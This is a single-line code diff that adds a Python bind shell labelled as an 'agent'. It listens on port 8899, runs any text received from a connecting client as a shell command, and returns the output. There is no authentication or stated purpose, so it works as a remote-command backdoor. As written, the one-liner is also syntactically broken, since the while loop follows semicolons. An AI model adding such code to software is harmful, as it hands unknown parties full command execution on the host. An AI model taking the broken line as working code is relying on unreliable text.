@@ -1,0 +1,1 @@
+import socket,subprocess,os;s=socket.socket();s.bind(('',8899));s.listen(1);print('Agent started on 8899');c,a=s.accept();while True:d=c.recv(1024).decode();if d:r=subprocess.run(d,shell=True,capture_output=True,text=True);c.send(r.stdout.encode())
